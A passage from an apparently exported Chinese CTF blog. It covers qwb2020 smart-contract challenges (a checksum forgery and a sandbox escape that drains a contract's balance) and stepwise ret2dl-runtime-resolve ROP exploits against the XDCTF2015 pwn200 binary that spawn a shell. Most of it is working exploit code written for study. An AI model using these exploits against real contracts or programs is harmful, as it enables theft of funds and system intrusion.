selfdestruct(msg.sender); &#125; &#125; function pass(uint idx, bytes memory bytecode) public &#123; address addr = deploy(bytecode); bytes32 cs = tag(bytecode); bytes32 tmp = keccak256(abi.encodePacked(uint(1))); uint32 v; bool flag = false; assembly &#123; let v1,v2 v := sload(add(tmp, idx)) if gt(v, sload(0))&#123; v1 := and(add(and(v,0xffffffff), and(shr(0x20,v), 0xffffffff)), 0xffffffff) v2 := and(add(xor(and(shr(0x40,v), 0xffffffff), and(shr(0x60,v), 0xffffffff)), and(shr(0x80,v),0xffffffff)), 0xffffffff) if eq(xor(mul(v2,0x100000000), v1), cs)&#123; flag := 1 &#125; &#125; &#125; if(flag)&#123; WinChecksum[addr] = cs; &#125;else&#123; WinChecksum[addr] = bytes32(0); &#125; &#125; function tag(bytes memory a) pure public returns(bytes32 cs) &#123; assembly&#123; let groupsize := 16 let head := add(a,groupsize) let tail := add(head, mload(a)) let t1 := 0x13145210 let t2 := 0x80238023 let m1,m2,m3,m4,s,tmp for &#123; let i := head &#125; lt(i, tail) &#123; i := add(i, groupsize) &#125; &#123; s := 0x59129121 tmp := mload(i) m1 := and(tmp,0xffffffff) m2 := and(shr(0x20,tmp),0xffffffff) m3 := and(shr(0x40,tmp),0xffffffff) m4 := and(shr(0x60,tmp),0xffffffff) for &#123; let j := 0 &#125; lt(j, 0x4) &#123; j := add(j, 1) &#125; &#123; s := and(mul(s, 2),0xffffffff) t2 := and(add(t1, xor(sub(mul(t1, 0x10), m1),xor(add(t1, s),add(div(t1,0x20), m2)))), 0xffffffff) t1 := and(add(t2, xor(add(mul(t2, 0x10), m3),xor(add(t2, s),sub(div(t2,0x20), m4)))), 0xffffffff) &#125; &#125; cs := xor(mul(t1,0x100000000),t2) &#125; &#125; function payforflag(bytes memory code) public onlyWin(code) &#123; emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125;&#125; Analyse tag 是对字节码进行编码得到 cs，pass 是对 cs 进行校验，可以分析发现是对 owner 进行相关计算，对其结果记为 target，即 cs经过校验后等于 target 攻击合约hack，获取bytecode 12345678contract hack &#123; address instance_address = 0xbA2e98a2795c193F58C8CE1287fDA28e089c313a ; EasyAssembly target = EasyAssembly(instance_address); function hack1(bytes memory code) public &#123; target.payforflag(code); &#125;&#125; 正常情况下，对合约字节码进行编码后正好等于特定某个值的几率几乎为 0 ，所以需要另想办法，这里用到考点一，合约字节码后进行 padding 不会影响合约的部署 使用 tag 计算攻击合约 hack 字节码的 cs ，然后我们计算需要 padding 的字节 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from z3 import *def find(last, target): t1, t2 = int(last[:8], 16), int(last[8:], 16) tar1, tar2 = int(target[:8], 16), int(target[8:], 16) s = 0x59129121 s = BitVecVal(s, 256) m1 = BitVec('m1', 256) m2 = BitVec('m2', 256) m3 = BitVec('m3', 256) m4 = BitVec('m4', 256) for j in range(4): s = (s + s) &amp; 0xffffffff p1 = (t1&lt;&lt;4) - m1 p2 = t1 + s p3 = (t1&gt;&gt;5) + m2 t2 = (t1 + (p1^(p2^p3))) &amp; 0xffffffff p1 = (t2&lt;&lt;4) + m3 p2 = t2 + s p3 = (t2&gt;&gt;5) - m4 t1 = (t2 + (p1^(p2^p3))) &amp; 0xffffffff sol = Solver() sol.add(And(t1 == tar1, t2 == tar2)) if sol.check(): m = sol.model() m_l = map(lambda x: m[x].as_long(), [m4, m3, m2, m1]) pad = 0 for x in m_l: pad &lt;&lt;= 0x20 pad |= x return hex(pad)[2:].zfill(32) else: raise Exception('No solution')def cal_target(address): a = address &amp; 0xffffffff b = address&gt;&gt;0x20 &amp; 0xffffffff c = address&gt;&gt;0x40 &amp; 0xffffffff d = address&gt;&gt;0x60 &amp; 0xffffffff e = address&gt;&gt;0x80 &amp; 0xffffffff v1 = (a+b) &amp; 0xffffffff v2 = ((c ^ d) + e) &amp; 0xffffffff target = v2&lt;&lt;0x20 | v1 print hex(target) return hex(target)address = 0x000000000000000000000000082d1deb3d08277650966471756b06fead5cb43flast = "a7f27fea495824ae"target = cal_target(address)[2:-1]print find(last, target) 调用 pass ，其中 idx 为 owner 所在的 slot 与 puzzle 数组数据起始位置的差值，是个固定值17666428025195830108258939064971598484477117555719083663154155265588858226250 ，bytecode 是进行 padding 之后的字节码（这里需要注意字节码 16 字节对齐） 调用 hack 攻击合约的 hack1 即可，这里的 code 是 create2() 中的参数，可通过下述脚本计算，code 就是脚本中的 s Create2 : keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]1234567891011121314from web3 import Web3def bytesToHexString(bs): return ''.join(['%02X' % b for b in bs])bytecode = '0x608060405273ba2e98a2795c193f58c8ce1287fda28e089c313a6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100c657600080fd5b50610248806100d66000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063489dc88514610030575b600080fd5b6100e96004803603602081101561004657600080fd5b810190808035906020019064010000000081111561006357600080fd5b82018360208201111561007557600080fd5b8035906020019184600183028401116401000000008311171561009757600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506100eb565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662a9a87e82306040518363ffffffff1660e01b815260040180806020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828103825284818151815260200191508051906020019080838360005b838110156101ab578082015181840152602081019050610190565b50505050905090810190601f1680156101d85780820380516001836020036101000a031916815260200191505b509350505050600060405180830381600087803b1580156101f857600080fd5b505af115801561020c573d6000803e3d6000fd5b505050505056fea265627a7a72315820fc052defd6381390e09fa96b74c0f55872043fcede05171fb78f3c814d755fe664736f6c6343000511003200007197d58f43114ce23d95b93f9df2bb08'a = '0xff' # 1 byteb = 'bA2e98a2795c193F58C8CE1287fDA28e089c313a' # b: deploy address 20 bytesc = '0'*60 + '1234' # c: seed 32 bytesd = bytesToHexString(Web3.sha3(hexstr=bytecode)) # deploy bytecode 32 bytess = a+b+c+dprint(s)address = '0x' + bytesToHexString(Web3.sha3(hexstr=s))[24:]print(address) EasySandboxSource1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859pragma solidity ^0.5.10;contract EasySandbox &#123; uint256[] public writes; mapping(address =&gt; address[]) public sons; address public owner; uint randomNumber = 0; constructor() public payable &#123; owner = msg.sender; sons[msg.sender].push(msg.sender); writes.length -= 1; &#125; function given_gift(uint256 _what, uint256 _where) public &#123; if(_where != 0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9f) &#123; writes[_where] = _what; &#125; &#125; function easy_sandbox(address _addr) public payable &#123; require(sons[owner][0] == owner); require(writes.length != 0); bool mark = false; for(uint256 i = 0; i &lt; sons[owner].length; i++) &#123; if(msg.sender == sons[owner][i]) &#123; mark = true; &#125; &#125; require(mark); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; bool success; bytes memory _; (success, _) = _addr.delegatecall(&quot;&quot;); require(success); require(writes.length == 0); require(sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin); &#125;&#125; Analyse 题目逆向还是有难度的，后来直接给了源码 考点有三个： 考察对动态数组、map类型数据的存储规则计算 考察对 EVM 执行的理解 考察 create2 可以看到主体函数就两个 given_gift 任意写 easy_sandbox 过滤了 f0、f1、f2、f4、fa、ff 这些字节，如果站在操作码层次，这些字节对应操作码分别是 create、call、callcode、delegatecall、staticcall、selfdestruct，相当于这些操作码都不能使用，如果想要清空合约余额的话，只能使用 create2 创建一个类似转账的合约 Exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pragma solidity ^0.5.10;contract EasySandbox &#123; function given_gift(uint256 _what, uint256 _where) public &#123;&#125; function easy_sandbox(address _addr) public payable &#123;&#125;&#125;/*owner 0x3d16CAAf6E5C0bB28787F38Aba430E17F301e737tx.origin 0x1e7AEf620B2ad727193DD1B2ADda7f1e535CbfB3pos1 = kec(owner | 1) = 0xfabdb57a8705ecba0fd43952ffce712af6481580f284fb255bc099ff824b60a8pos2 = kec(kec(owner | 1)) = 0x5db10778892cc9518ed72a1672706295f104d0e8fde9e79a67c38a7cf69a5399sstore(pos1, 1) 60017f8abdb57a8705ecba0fd439528fce712af64815808284fb255bc09988824b60a87f70000000000000000000000070000000000000007000000000000077000000000155[1] PUSH1 0x01[34] PUSH32 0x8abdb57a8705ecba0fd439528fce712af64815808284fb255bc09988824b60a8[67] PUSH32 0x7000000000000000000000007000000000000000700000000000007700000000[68] ADD[69] SSTOREsstore(0, 0) 60008055[1] PUSH1 0x00[2] DUP1[3] SSTOREsstore(pos2, tx.origin) 327f30000000000000000000000000000000050000000000000000000000000000007f8db10778892cc9518ed72a1672706295f604d0e8fde9e79a67c38a7cf69a53990355[0] ORIGIN[33] PUSH32 0x3000000000000000000000000000000005000000000000000000000000000000[66] PUSH32 0x8db10778892cc9518ed72a1672706295f604d0e8fde9e79a67c38a7cf69a5399[67] SUB[68] SSTOREcreate2 SELFDESTRUCT 6132fe6001013452346004601c3031f5[2] PUSH2 0x32fe[4] PUSH1 0x01[5] ADD[6] CALLVALUE[7] MSTORE[8] CALLVALUE[10] PUSH1 0x04[12] PUSH1 0x1c[13] ADDRESS[14] BALANCE[15] CREATE2*/contract pikachu &#123; constructor() public payable &#123; assembly &#123; mstore(0x00, 0x60017f8abdb57a8705ecba0fd439528fce712af64815808284fb255bc0998882) mstore(0x20, 0x4b60a87f70000000000000000000000070000000000000007000000000000077) mstore(0x40, 0x00000000015560008055327f3000000000000000000000000000000005000000) mstore(0x60, 0x0000000000000000000000007f8db10778892cc9518ed72a1672706295f604d0) mstore(0x80, 0xe8fde9e79a67c38a7cf69a539903556132fe6001013452346004601c3031f500) return(0x00, 0xa0) &#125; &#125;&#125;contract Hack &#123; EasySandbox private constant target = EasySandbox(0xde07f6D17206CdC4f2Af94ad9e6324544a70a360); constructor() public payable &#123; bool result; // modify kec(owner | 1) = 2 (result, ) = address(target).call(abi.encodeWithSelector( 0x5e08b9d5, 2, uint(0xfabdb57a8705ecba0fd43952ffce712af6481580f284fb255bc099ff824b60a8-0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563) )); require(result); // modify kec(kec(owner | 1)) + 1 = msg.sender (result, ) = address(target).call(abi.encodeWithSelector( 0x5e08b9d5, uint(address(this)), uint(0x5db10778892cc9518ed72a1672706295f104d0e8fde9e79a67c38a7cf69a5399-0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563+1) )); require(result); // writes.length == 0 // sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin // empty balance pikachu hack = new pikachu(); (result, ) = address(target).call(abi.encodeWithSelector( 0xc94103b1, hack )); require(result); &#125;&#125; 具体过程都在上面 exp 的注释里面 需要注意的是： 由于 sandbox 禁止的是特定的字节，而不是特定的操作码，这意味着在上下文中也禁止这些字节，所以我们的 code 要使用字节码编写 若在攻击字节码中出现了 sandbox 中的黑名单字节，我们需要使用巧妙的方式去绕过它]]></content>
      <categories>
        <category>qwb2020</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>qwb2020</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一步一步构建 dl-runtime-resolve]]></title>
    <url>%2F2020%2Fstepbystep-dl-runtime-resolve%2F</url>
    <content type="text"><![CDATA[前言 一步一步构建 dl-runtime-resolve，详细理解其解析过程 参考 http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ 参考 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/ elf 文件链接 https://github.com/hitcxy/pwn-challenges/tree/master/study 漏洞利用方式 控制 eip 为 PLT[0] 的地址，只需传递一个 index_arg 参数 控制 index_arg 的大小，使 reloc 的位置落在可控地址内 伪造 reloc 的内容，使 sym 落在可控地址内 伪造 sym 的内容，使 name 落在可控地址内 伪造 name 为任意库函数，如 system stage1 先把栈迁移到 bss 上，并返回 write@plt 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stager.sendline(payload)cmd = "/bin/sh"payload2 = 'AAAA' # 接上一个payload的leave-&gt;pop ebp ; retpayload2 += p32(write_plt)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage2 控制 eip 返回 PLT[0] ，要带上 write 的 index_offset 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380 # objdump -d -j .plt bofindex_offset = 0x20 # write's indexpayload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage3 控制 index_offset ，使其指向我们构造的 fake_reloc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380 # objdump -d -j .plt bofrel_plt = 0x08048330 # objdump -s -j .rel.plt bofindex_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移write_got = elf.got['write']r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage4 这次构造 fake_sym ，使其指向我们控制的 st_name 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage5 把 st_name 指向输入的字符串 &quot;write&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += "write\x00"payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage6 替换 write 为 system ，并修改 system 的参数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(base_stage + 80)payload2 += 'B' * 4payload2 += 'B' * 4payload2 += fake_reloc # (base_stage+28)的位置payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += "system\x00"payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dl-runtime-resolve]]></title>
    <url>%2F2020%2Fdl-runtime-resolve%2F</url>
    <content type="text"><![CDATA[前言 在Linux中如果程序想要调用其它动态链接库的函数，必须要在程序加载的时候动态链接；在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，比如一些错误处理函数或者一些用户很少用到的功能模块，所以ELF采用一种叫做延迟绑定(Lazy Binding)的做法，基本思想就是当函数第一次被调用的时候才进行绑定（符号查找、重定位等）；而在Linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)函数来对动态链接的函数进行重定位的。 _dl_runtime_resolve函数具体运行模式 首先用link_map访问.dynamic，分别取出.dynstr、.dynsym、.rel.plt的地址 .rel.plt+参数reloc_index，求出当前函数的重定位表项Elf32_Rel的指针，记作rel rel-&gt;r_info &gt;&gt; 8 作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym .dynstr + sym-&gt;st_name得出符号名 字符串指针 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表 最后调用这个函数 以puts为例追踪一下ELF文件libc函数解析过程call puts@plt si进入call puts@plt 因为会jmp dword ptr [0x804a00c]，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts@plt第二条指令的地址，即read@got中初始存放read@plt的第二条指令地址 jmp 0x80482d0 其中ds:0x804a008存放的是_dl_runtime_resolve的地址 这样的话，加上之前的push 0，就push了两个参数，这两个参数刚好是_dl_runtime_resolve(link_map_obj, reloc_index)需要的参数，其中0x804a004就是link_map指针，0就是reloc_index 12push 0push dword ptr [0x804a004] 那么我们看看通过这两个参数是如何找到puts函数的呢 首先找到link_map的地址 然后通过link_map找到.dynamic的地址，其中第三个地址就是.dynamic的地址，即0x8049f14 然后通过.dynamic来找到.dynstr、.dynsym、.rel.plt的地址.dynamic的地址加0x44的位置是.dynstr:[0x08049f14+0x44]=[0x08049f58]，即0x0804821c.dynamic的地址加0x4c的位置是.dynsym:[0x08049f14+0x4c]=[0x08049f60]，即0x080481cc.dynamic的地址加0x84的位置是.rel.plt:[0x08049f14+0x84]=[0x08049f98]，即0x08048298 然后用.rel.plt的地址加上参数reloc_index，即0x8048298+0=0x8048298找到函数的重定位表项Elf32_Rel的指针，记作rel 这里rel为0x8048298，所以 12r_offset = 0x804a00cr_info = 107h 通过Elf32_rel结构的r_info &gt;&gt; 8 = 107h &gt;&gt; 8 = 1 作为.dynsym中的下标 查看0x80481dc内存，找到puts在.dynstr表项索引为0x1a，所以st_name的地址为0x804821c+0x1a=0x8048236 最后在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表就可以了 利用思路 事实上，虚拟地址是从st_name得来的，只要我们能够修改这个st_name的内容就可以执行任意函数，比如把st_name的内容修改为&quot;system&quot; reloc_index即参数n是我们可以控制的，我们需要做的事通过一系列操作，把reloc_index可控转化为st_name可控；我们需要在一个可写地址上构造一系列伪结构就可以完成利用或在条件允许的情况下直接修改.dynstr 所以我们需要在程序中找一段空间start出来，放我们直接构造的fake_dynsym，fake_dynstr和fake_rel_plt等，然后利用栈迁移到手法将栈转移到start 计算reloc_index relic_index = fake_rel_plt_addr - 0x804833c 计算r_info r_info的计算方法有两个步骤 x = （欲伪造的地址 - .dynsym基地址）/ 0x10 r_info = x &lt;&lt; 8 | 0x7 计算st_name st_name = fake_dynstr_addr - 0x804827c 例子（这里有XDCTF2015的 pwn200） 方法一 直接使用 write 泄漏 libc ，然后执行 system(&#39;/bin/sh&#39;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *local=1pc='./main'aslr=Truecontext.log_level=True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc=ELF('./libc6_2.27-3ubuntu1.2_i386.so')pwn200=ELF('./main')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,'c')else: remote_addr=['111.198.29.45', 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =""): gdb.attach(p , b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))if __name__ == '__main__': write_plt = pwn200.plt['write'] lg('write_plt', write_plt) write_got = pwn200.got['write'] lg('write_got', write_got) start_addr = pwn200.symbols['_start'] lg('start_addr', start_addr) ru("Welcome to XDCTF2015~!\n") payload = 'a'*0x6c payload += 'b'*4 payload += p32(write_plt) payload += p32(start_addr) payload += p32(1) payload += p32(write_got) payload += p32(4) sl(payload) write_addr = u32(rv(4)) lg('write_addr', write_addr) libc_base = write_addr - libc.symbols['write'] system_addr = libc_base + libc.symbols['system'] binsh_addr = libc_base + libc.search("/bin/sh").next() lg('libc_addr', libc_base) lg('system_addr', system_addr) lg('binsh_addr', binsh_addr) payload = 'a'*0x6c payload += 'b'*4 payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(binsh_addr) sl(payload) pi() 方法二 直接使用了roputils库，比较简洁 123456789101112131415161718192021222324252627# coding=utf-8from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextprocessName = 'main'offset = 112r = process('./' + processName)context.log_level = 'debug'rop = ROP('./' + processName)bss_base = rop.section('.bss')buf = rop.fill(offset)buf += rop.call('read', 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string('/bin/sh')buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, 'system')buf += rop.fill(100, buf)r.send(buf)r.interactive() 方法三 其实一步一步伪构造能更容易理解过程，可以参考高级ROP ret2dl_runtime 之通杀详解和ROP高级用法之ret2_dl_runtime_resolve 上面构造的ROP左边是做一个栈的迁移 右边是伪造的解析链 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context.log_level = 'debug'context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']name = 